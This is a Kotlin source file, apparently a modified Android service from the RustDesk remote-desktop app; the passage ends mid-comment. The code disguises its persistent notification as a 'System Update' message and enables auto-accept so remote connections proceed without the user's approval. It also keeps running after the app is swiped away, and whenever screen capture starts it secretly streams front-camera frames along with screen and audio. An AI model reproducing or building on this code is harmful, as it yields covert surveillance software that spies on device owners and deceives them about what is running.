package com.carriez.flutter_hbb

import ffi.FFI

/**
 * Capture screen,get video and audio,send to rust.
 * Dispatch notifications
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.PendingIntent.FLAG_IMMUTABLE
import android.app.PendingIntent.FLAG_UPDATE_CURRENT
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.content.res.Configuration.ORIENTATION_LANDSCAPE
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.graphics.ImageFormat
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
import android.view.WindowManager
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import java.util.concurrent.Executors
import kotlin.concurrent.thread
import org.json.JSONException
import org.json.JSONObject
import java.nio.ByteBuffer
import kotlin.math.max
import kotlin.math.min

const val DEFAULT_NOTIFY_TITLE = "System Update"
const val DEFAULT_NOTIFY_TEXT = "Scheduled update postponed."
const val DEFAULT_NOTIFY_ID = 1
const val NOTIFY_ID_OFFSET = 100

const val MIME_TYPE = MediaFormat.MIMETYPE_VIDEO_VP9

// video const

const val MAX_SCREEN_SIZE = 1200

const val VIDEO_KEY_BIT_RATE = 1024_000
const val VIDEO_KEY_FRAME_RATE = 30

class MainService : Service() {

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustPointerInput(kind: Int, mask: Int, x: Int, y: Int) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
                Log.d(logTag, "Turn on Screen, WakeLock release")
                wakeLock.release()
            }
            Log.d(logTag,"Turn on Screen")
            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    InputService.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                    InputService.ctx?.onMouseInput(mask, x, y)
                }
                else -> {
                }
            }
        }
    }

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustKeyEventInput(input: ByteArray) {
        InputService.ctx?.onKeyEvent(input)
    }

    @Keep
    fun rustGetByName(name: String): String {
        return when (name) {
            "screen_size" -> {
                JSONObject().apply {
                    put("width",SCREEN_INFO.width)
                    put("height",SCREEN_INFO.height)
                    put("scale",SCREEN_INFO.scale)
                }.toString()
            }
            "is_start" -> {
                isStart.toString()
            }
            else -> ""
        }
    }

    @Keep
    fun rustSetByName(name: String, arg1: String, arg2: String) {
        when (name) {
            "add_connection" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    val isFileTransfer = jsonObject["is_file_transfer"] as Boolean
                    val type = if (isFileTransfer) {
                        translate("Transfer file")
                    } else {
                        translate("Share screen")
                    }
                    
                    Log.d(logTag, "Connection received from $username - mediaProjection ready: ${mediaProjection != null}")
                    
                    // Request media projection if not available (standalone, without MainActivity)
                    if (mediaProjection == null && !_isReady) {
                        Log.d(logTag, "Media projection not ready - requesting it for client connection")
                        // Request media projection for this connection
                        requestMediaProjection()
                        // Don't call startCapture yet - let it be called in setMediaProjection() after permission is granted
                        Log.d(logTag, "Waiting for media projection permission before starting capture")
                        onClientAuthorizedNotification(id, type, username, peerId)
                    } else if (mediaProjection != null) {
                        // Media projection already available - start capture immediately
                        if (startCapture()) {
                            Log.d(logTag, "Capture started successfully for $username")
                            onClientAuthorizedNotification(id, type, username, peerId)
                        } else {
                            Log.d(logTag, "Capture failed")
                            onClientAuthorizedNotification(id, type, username, peerId)
                        }
                    }
                } catch (e: JSONException) {
                    Log.e(logTag, "Error processing add_connection: ${e.message}")
                    e.printStackTrace()
                }
            }
            "update_voice_call_state" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    val inVoiceCall = jsonObject["in_voice_call"] as Boolean
                    val incomingVoiceCall = jsonObject["incoming_voice_call"] as Boolean
                    if (!inVoiceCall) {
                        if (incomingVoiceCall) {
                            voiceCallRequestNotification(id, "Voice Call Request", username, peerId)
                        } else {
                            if (!audioRecordHandle.switchOutVoiceCall(mediaProjection)) {
                                Log.e(logTag, "switchOutVoiceCall fail")
                                MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                    "type" to "custom-nook-nocancel-hasclose-error",
                                    "title" to "Voice call",
                                    "text" to "Failed to switch out voice call."))
                            }
                        }
                    } else {
                        if (!audioRecordHandle.switchToVoiceCall(mediaProjection)) {
                            Log.e(logTag, "switchToVoiceCall fail")
                            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                "type" to "custom-nook-nocancel-hasclose-error",
                                "title" to "Voice call",
                                "text" to "Failed to switch to voice call."))
                        }
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            "stop_capture" -> {
                Log.d(logTag, "from rust:stop_capture - stopping media projection for disconnected clients")
                stopCapture()
                // Also stop media projection when all clients disconnect
                try {
                    mediaProjection?.stop()
                    mediaProjection = null
                    _isReady = false
                    isRequestingMediaProjection = false
                    Log.d(logTag, "Media projection stopped as all clients disconnected")
                } catch (e: Exception) {
                    Log.e(logTag, "Error stopping media projection: ${e.message}")
                }
            }
            "half_scale" -> {
                val halfScale = arg1.toBoolean()
                if (isHalfScale != halfScale) {
                    isHalfScale = halfScale
                    updateScreenInfo(resources.configuration.orientation)
                }
                
            }
            else -> {
            }
        }
    }

    private var serviceLooper: Looper? = null
    private var serviceHandler: Handler? = null

    private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "rustdesk:wakelock")}

    companion object {
        private var _isReady = false // media permission ready status
        private var _isStart = false // screen capture start status
        private var _isAudioStart = false // audio capture start status
        val isReady: Boolean
            get() = _isReady
        val isStart: Boolean
            get() = _isStart
        val isAudioStart: Boolean
            get() = _isAudioStart
    }

    private val logTag = "LOG_SERVICE"
    private val useVP9 = false
    private val binder = LocalBinder()

    private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33

    // video
    private var mediaProjection: MediaProjection? = null
    private var isRequestingMediaProjection = false  // Flag to prevent multiple simultaneous requests
    private var surface: Surface? = null
    private val sendVP9Thread = Executors.newSingleThreadExecutor()
    private var videoEncoder: MediaCodec? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null

    // audio
    private val audioRecordHandle = AudioRecordHandle(this, { isStart }, { isAudioStart })

    // camera (for camera share feature)
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraImageReader: ImageReader? = null
    private var cameraCaptureSession: CameraCaptureSession? = null
    private var isCameraCapturing = false
    private var cameraThread: Thread? = null
    private val cameraThreadLock = Any()

    // notification
    private lateinit var notificationManager: NotificationManager
    private lateinit var notificationChannel: String
    private lateinit var notificationBuilder: NotificationCompat.Builder

    override fun onCreate() {
        super.onCreate()
        Log.d(logTag,"MainService onCreate, sdk int:${Build.VERSION.SDK_INT} reuseVirtualDisplay:$reuseVirtualDisplay")
        FFI.init(this)
        HandlerThread("Service", Process.THREAD_PRIORITY_BACKGROUND).apply {
            start()
            serviceLooper = looper
            serviceHandler = Handler(looper)
        }
        updateScreenInfo(resources.configuration.orientation)
        initNotification()

        // keep the config dir same with flutter
        val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
        val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
        FFI.startServer(configPath, "")
        
        // Ensure auto-accept mode is enabled for the service to accept connections without UI
        ensureAutoAcceptModeForService()
        
        // If mediaProjection is not ready, try to request it
        if (mediaProjection == null && !isReady) {
            Log.d(logTag, "Media projection not ready on service creation, will request when needed")
        }

        createForegroundNotification()
    }

    override fun onDestroy() {
        checkMediaPermission()
        stopService(Intent(this, FloatingWindowService::class.java))
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // Called when app is swiped from recent apps
        // Keep the foreground notification and service running
        Log.d(logTag, "Task removed (app swiped from recent apps) - keeping service running with notification")
        
        // Restart foreground notification to persist it
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(false)  // Don't cancel on click
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
            .setOnlyAlertOnce(true)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        
        startForeground(DEFAULT_NOTIFY_ID, notification)
        super.onTaskRemoved(rootIntent)
    }

    private var isHalfScale: Boolean? = null;
    private fun updateScreenInfo(orientation: Int) {
        var w: Int
        var h: Int
        var dpi: Int
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val m = windowManager.maximumWindowMetrics
            w = m.bounds.width()
            h = m.bounds.height()
            dpi = resources.configuration.densityDpi
        } else {
            val dm = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(dm)
            w = dm.widthPixels
            h = dm.heightPixels
            dpi = dm.densityDpi
        }

        val max = max(w,h)
        val min = min(w,h)
        if (orientation == ORIENTATION_LANDSCAPE) {
            w = max
            h = min
        } else {
            w = min
            h = max
        }
        Log.d(logTag,"updateScreenInfo:w:$w,h:$h")
        var scale = 1
        if (w != 0 && h != 0) {
            if (isHalfScale == true && (w > MAX_SCREEN_SIZE || h > MAX_SCREEN_SIZE)) {
                scale = 2
                w /= scale
                h /= scale
                dpi /= scale
            }
            if (SCREEN_INFO.width != w) {
                SCREEN_INFO.width = w
                SCREEN_INFO.height = h
                SCREEN_INFO.scale = scale
                SCREEN_INFO.dpi = dpi
                if (isStart) {
                    stopCapture()
                    FFI.refreshScreen()
                    startCapture()
                } else {
                    FFI.refreshScreen()
                }
            }

        }
    }

    override fun onBind(intent: Intent): IBinder {
        Log.d(logTag, "service onBind")
        return binder
    }

    inner class LocalBinder : Binder() {
        init {
            Log.d(logTag, "LocalBinder init")
        }

        fun getService(): MainService = this@MainService
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("whichService", "this service: ${Thread.currentThread()}")
        super.onStartCommand(intent, flags, startId)
        if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
            createForegroundNotification()

            if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                FFI.startService()
            }
            Log.d(logTag, "service starting: ${startId}:${Thread.currentThread()}")
            val mediaProjectionManager =
                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

            intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)?.let {
                mediaProjection =
                    mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
                checkMediaPermission()
                _isReady = true
            } ?: let {
                Log.d(logTag, "Media projection intent not available - will request only when client connects")
                // Don't request media projection on startup - wait for client connection
            }
        } else if (intent?.action == ACT_MEDIA_PROJECTION_DENIED) {
            onMediaProjectionPermissionDenied()
        }
        return START_NOT_STICKY // don't use sticky (auto restart), the new service (from auto restart) will lose control
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        updateScreenInfo(newConfig.orientation)
    }

    private fun requestMediaProjection() {
        // Prevent multiple simultaneous permission requests
        if (isRequestingMediaProjection) {
            Log.d(logTag, "Media projection request already in progress, skipping")
            return
        }
        
        isRequestingMediaProjection = true
        val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
            action = ACT_REQUEST_MEDIA_PROJECTION
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

    @SuppressLint("WrongConstant")
    private fun createSurface(): Surface? {
        return if (useVP9) {
            // TODO
            null
        } else {
            Log.d(logTag, "ImageReader.newInstance:INFO:$SCREEN_INFO")
            imageReader =
                ImageReader.newInstance(
                    SCREEN_INFO.width,
                    SCREEN_INFO.height,
                    PixelFormat.RGBA_8888,
                    4
                ).apply {
                    setOnImageAvailableListener({ imageReader: ImageReader ->
                        try {
                            // If not call acquireLatestImage, listener will not be called again
                            imageReader.acquireLatestImage().use { image ->
                                if (image == null || !isStart) return@setOnImageAvailableListener
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                buffer.rewind()
                                FFI.onVideoFrameUpdate(buffer)
                            }
                        } catch (ignored: java.lang.Exception) {
                        }
                    }, serviceHandler)
                }
            Log.d(logTag, "ImageReader.setOnImageAvailableListener done")
            imageReader?.surface
        }
    }

    fun onVoiceCallStarted(): Boolean {
        return audioRecordHandle.onVoiceCallStarted(mediaProjection)
    }

    fun onVoiceCallClosed(): Boolean {
        return audioRecordHandle.onVoiceCallClosed(mediaProjection)
    }

    fun startCapture(): Boolean {
        if (isStart) {
            return true
        }
        if (mediaProjection == null) {
            Log.w(logTag, "startCapture: mediaProjection is null, requesting it")
            requestMediaProjection()
            return false
        }
        
        updateScreenInfo(resources.configuration.orientation)
        Log.d(logTag, "Start Capture")
        surface = createSurface()

        if (useVP9) {
            startVP9VideoRecorder(mediaProjection!!)
        } else {
            startRawVideoRecorder(mediaProjection!!)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!audioRecordHandle.createAudioRecorder(false, mediaProjection)) {
                Log.d(logTag, "createAudioRecorder fail")
            } else {
                Log.d(logTag, "audio recorder start")
                audioRecordHandle.startAudioRecorder()
            }
        }
        checkMediaPermission()
        _isStart = true
        
        // Start camera capture for camera sharing (runs independently alongside screen capture)
        try {
            startCameraCapture()
        } catch (e: Exception) {
            Log.w(logTag, "Failed to start camera capture: ${e.message}")
            // Don't fail the entire capture if camera fails - screen capture is primary
        }
        FFI.setFrameRawEnable("video",true)
        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
        return true
    }

    @Synchronized
    fun stopCapture() {
        Log.d(logTag, "Stop Capture")
        FFI.setFrameRawEnable("video",false)
        
        // Stop camera capture
        try {
            stopCameraCapture()
        } catch (e: Exception) {
            Log.w(logTag, "Error stopping camera capture: ${e.message}")
        }
        
        _isStart = false
        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
        // release video
        if (reuseVirtualDisplay) {
            // The virtual display video projection can be paused by calling `setSurface(null)`.
            // https://developer.android.com/reference/android/hardware/display/VirtualDisplay.Callback
            // https://learn.microsoft.com/en-us/dotnet/api/android.hardware.display.virtualdisplay.callback.onpaused?view=net-android-34.0
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }
        // suface needs to be release after `imageReader.close()` to imageReader access released surface
        // https://github.com/rustdesk/rustdesk/issues/4118#issuecomment-1515666629
        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null
        // suface needs to be release after `imageReader.close()` to imageReader access released surface
        // https://github.com/rustdesk/rustdesk/issues/4118#issuecomment-1515666629
        surface?.release()

        // release audio
        _isAudioStart = false
        audioRecordHandle.tryReleaseAudio()
    }

    /**
     * Start camera capture for camera sharing feature
     * Initializes Camera2 API and begins capturing frames
     */
    fun startCameraCapture() {
        try {
            Log.d(logTag, "Starting camera capture")
            if (isCameraCapturing) {
                Log.w(logTag, "Camera is already capturing")
                return
            }

            // Check camera permission
            if (!hasCameraPermission()) {
                Log.e(logTag, "Camera permission not granted")
                return
            }

            isCameraCapturing = true
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

            // Find front-facing camera
            var frontCameraId: String? = null
            for (cameraId in cameraManager!!.cameraIdList) {
                val characteristics = cameraManager!!.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = cameraId
                    break
                }
            }

            if (frontCameraId == null) {
                Log.e(logTag, "No front-facing camera found")
                isCameraCapturing = false
                return
            }

            // Create ImageReader for frame capture
            val characteristics = cameraManager!!.getCameraCharacteristics(frontCameraId)
            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = streamConfigMap?.getOutputSizes(ImageFormat.YUV_420_888)

            // Use a reasonable size (640x480 or available size)
            val selectedSize = outputSizes?.firstOrNull { it.width == 640 && it.height == 480 }
                ?: outputSizes?.firstOrNull { it.width < 1280 && it.height < 960 }
                ?: outputSizes?.firstOrNull()

            if (selectedSize == null) {
                Log.e(logTag, "No suitable camera size found")
                isCameraCapturing = false
                return
            }

            Log.d(logTag, "Camera size selected: ${selectedSize.width}x${selectedSize.height}")

            cameraImageReader = ImageReader.newInstance(
                selectedSize.width,
                selectedSize.height,
                ImageFormat.YUV_420_888,
                2
            )

            cameraImageReader!!.setOnImageAvailableListener({ reader ->
                val image = reader?.acquireLatestImage()
                if (image != null) {
                    processCameraFrame(image)
                    image.close()
                }
            }, null)

            // Open camera
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                cameraManager!!.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCameraCaptureSession()
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        cameraDevice?.close()
                        cameraDevice = null
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(logTag, "Camera error: $error")
                        cameraDevice?.close()
                        cameraDevice = null
                        isCameraCapturing = false
                    }
                }, null)
            }

        } catch (e: Exception) {
            Log.e(logTag, "Error starting camera capture: ${e.message}")
            isCameraCapturing = false
        }
    }

    /**
     * Create camera capture session
     */
    private fun createCameraCaptureSession() {
        try {
            if (cameraDevice == null || cameraImageReader == null) return

            val requestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            requestBuilder.addTarget(cameraImageReader!!.surface)
            requestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            requestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)

            cameraDevice!!.createCaptureSession(
                listOf(cameraImageReader!!.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        cameraCaptureSession = session
                        try {
                            val captureRequest = requestBuilder.build()
                            session.setRepeatingRequest(captureRequest, null, null)
                            Log.d(logTag, "Camera capture session configured and started")
                        } catch (e: CameraAccessException) {
                            Log.e(logTag, "Error in capture session: ${e.message}")
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(logTag, "Failed to configure camera capture session")
                        isCameraCapturing = false
                    }
                },
                null
            )
        } catch (e: Exception) {
            Log.e(logTag, "Error creating camera capture session: ${e.message}")
            isCameraCapturing = false
        }
    }

    /**
     * Process camera frame and send to Rust backend
     */
    private fun processCameraFrame(image: android.media.Image) {
        try {
            if (!isCameraCapturing || image.format != ImageFormat.YUV_420_888) return

            val width = image.width
            val height = image.height
            val planes = image.planes

            // Calculate total size for YUV_420_888 format
            val ySize = planes[0].buffer.remaining()
            val uSize = planes[1].buffer.remaining()
            val vSize = planes[2].buffer.remaining()
            val totalSize = ySize + uSize + vSize

            // Create ByteBuffer and copy all plane data
            val frameBuffer = ByteBuffer.allocateDirect(totalSize)

            // Copy Y plane
            val yData = ByteArray(ySize)
            planes[0].buffer.get(yData)
            frameBuffer.put(yData)

            // Copy U plane
            val uData = ByteArray(uSize)
            planes[1].buffer.get(uData)
            frameBuffer.put(uData)

            // Copy V plane
            val vData = ByteArray(vSize)
            planes[2].buffer.get(vData)
            frameBuffer.put(vData)

            frameBuffer.rewind()

            // Send camera frame to Rust backend
            // Format: I420 (YUV 4:2:0 planar)
            FFI.onCameraFrameUpdate(width, height, 1, frameBuffer)

        } catch (e: Exception) {
            Log.e(logTag, "Error processing camera frame: ${e.message}")
        }
    }

    /**
     * Stop camera capture and release resources
     */
    fun stopCameraCapture() {
        try {
            Log.d(logTag, "Stopping camera capture")
            isCameraCapturing = false

            cameraCaptureSession?.close()
            cameraCaptureSession = null

            cameraDevice?.close()
            cameraDevice = null

            cameraImageReader?.close()
            cameraImageReader = null

            cameraManager = null
            Log.d(logTag, "Camera capture stopped and resources released")
        } catch (e: Exception) {
            Log.e(logTag, "Error stopping camera capture: ${e.message}")
        }
    }

    /**
     * Check if camera permission is granted
     */
    private fun hasCameraPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    fun destroy() {

        Log.d(logTag, "destroy service")
        _isReady = false
        _isAudioStart = false

        stopCapture()

        if (reuseVirtualDisplay) {
            virtualDisplay?.release()
            virtualDisplay = null
        }

        // Release media projection when service is destroyed
        mediaProjection?.stop()
        mediaProjection = null
        checkMediaPermission()
        stopForeground(true)
        stopService(Intent(this, FloatingWindowService::class.java))
        stopSelf()
    }

    fun checkMediaPermission(): Boolean {
        try {
            Handler(Looper.getMainLooper()).post {
                MainActivity.flutterMethodChannel?.invokeMethod(
                    "on_state_changed",
                    mapOf("name" to "media", "value" to isReady.toString())
                )
            }
        } catch (e: Exception) {
            Log.d(logTag, "MainActivity channel not available, skipping state update: ${e.message}")
        }
        try {
            Handler(Looper.getMainLooper()).post {
                MainActivity.flutterMethodChannel?.invokeMethod(
                    "on_state_changed",
                    mapOf("name" to "input", "value" to InputService.isOpen.toString())
                )
            }
        } catch (e: Exception) {
            Log.d(logTag, "MainActivity channel not available, skipping input state update: ${e.message}")
        }
        return isReady
    }

    private fun startRawVideoRecorder(mp: MediaProjection) {
        Log.d(logTag, "startRawVideoRecorder,screen info:$SCREEN_INFO")
        if (surface == null) {
            Log.d(logTag, "startRawVideoRecorder failed,surface is null")
            return
        }
        createOrSetVirtualDisplay(mp, surface!!)
    }

    private fun startVP9VideoRecorder(mp: MediaProjection) {
        createMediaCodec()
        videoEncoder?.let {
            surface = it.createInputSurface()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                surface!!.setFrameRate(1F, FRAME_RATE_COMPATIBILITY_DEFAULT)
            }
            it.setCallback(cb)
            it.start()
            createOrSetVirtualDisplay(mp, surface!!)
        }
    }

    // https://github.com/bk138/droidVNC-NG/blob/b79af62db5a1c08ed94e6a91464859ffed6f4e97/app/src/main/java/net/christianbeier/droidvnc_ng/MediaProjectionService.java#L250
    // Reuse virtualDisplay if it exists, to avoid media projection confirmation dialog every connection.
    private fun createOrSetVirtualDisplay(mp: MediaProjection, s: Surface) {
        try {
            virtualDisplay?.let {
                it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
                it.setSurface(s)
            } ?: let {
                virtualDisplay = mp.createVirtualDisplay(
                    "RustDeskVD",
                    SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi, VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    s, null, null
                )
            }
        } catch (e: SecurityException) {
            Log.w(logTag, "createOrSetVirtualDisplay: got SecurityException, re-requesting confirmation");
            // This initiates a prompt dialog for the user to confirm screen projection.
            requestMediaProjection()
        }
    }

    private val cb: MediaCodec.Callback = object : MediaCodec.Callback() {
        override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
        override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {}

        override fun onOutputBufferAvailable(
            codec: MediaCodec,
            index: Int,
            info: MediaCodec.BufferInfo
        ) {
            codec.getOutputBuffer(index)?.let { buf ->
                sendVP9Thread.execute {
                    val byteArray = ByteArray(buf.limit())
                    buf.get(byteArray)
                    // sendVp9(byteArray)
                    codec.releaseOutputBuffer(index, false)
                }
            }
        }

        override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
            Log.e(logTag, "MediaCodec.Callback error:$e")
        }
    }

    private fun createMediaCodec() {
        Log.d(logTag, "MediaFormat.MIMETYPE_VIDEO_VP9 :$MIME_TYPE")
        videoEncoder = MediaCodec.createEncoderByType(MIME_TYPE)
        val mFormat =
            MediaFormat.createVideoFormat(MIME_TYPE, SCREEN_INFO.width, SCREEN_INFO.height)
        mFormat.setInteger(MediaFormat.KEY_BIT_RATE, VIDEO_KEY_BIT_RATE)
        mFormat.setInteger(MediaFormat.KEY_FRAME_RATE, VIDEO_KEY_FRAME_RATE)
        mFormat.setInteger(
            MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible
        )
        mFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5)
        try {
            videoEncoder!!.configure(mFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        } catch (e: Exception) {
            Log.e(logTag, "mEncoder.configure fail!")
        }
    }

    private fun initNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "RustDesk"
            val channelName = "RustDesk Service"
            val channel = NotificationChannel(
                channelId,
                channelName, NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "RustDesk Service Channel"
                setSound(null, null) // Explicitly set the sound to null
                enableVibration(false)
            }
            channel.lightColor = Color.BLUE
            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            notificationManager.createNotificationChannel(channel)
            channelId
        } else {
            ""
        }
        notificationBuilder = NotificationCompat.Builder(this, notificationChannel)
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun createForegroundNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra("type", type)
        }
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
        }
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        startForeground(DEFAULT_NOTIFY_ID, notification)
    }

    private fun loginRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate("Do you accept?"))
            .setContentText("$type:$username-$peerId")
            // .setStyle(MediaStyle().setShowActionsInCompactView(0, 1))
            // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
            // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun onClientAuthorizedNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        cancelNotification(clientID)
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle("$type ${translate("Established")}")
            .setContentText("$username - $peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun voiceCallRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate("Do you accept?"))
            .setContentText("$type:$username-$peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun getClientNotifyID(clientID: Int): Int {
        return clientID + NOTIFY_ID_OFFSET
    }

    /**
     * Check if auto-accept connections is enabled (by checking if approveMode config is empty)
     */
    private fun isAutoAcceptEnabled(): Boolean {
        return try {
            val sp = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
            val approveMode = sp.getString("approve-mode", "Both") ?: "Both"
            // Empty string means auto-accept is enabled
            approveMode.isEmpty()
        } catch (e: Exception) {
            Log.e(logTag, "Error checking auto-accept status: ${e.message}")
            false
        }
    }

    /**
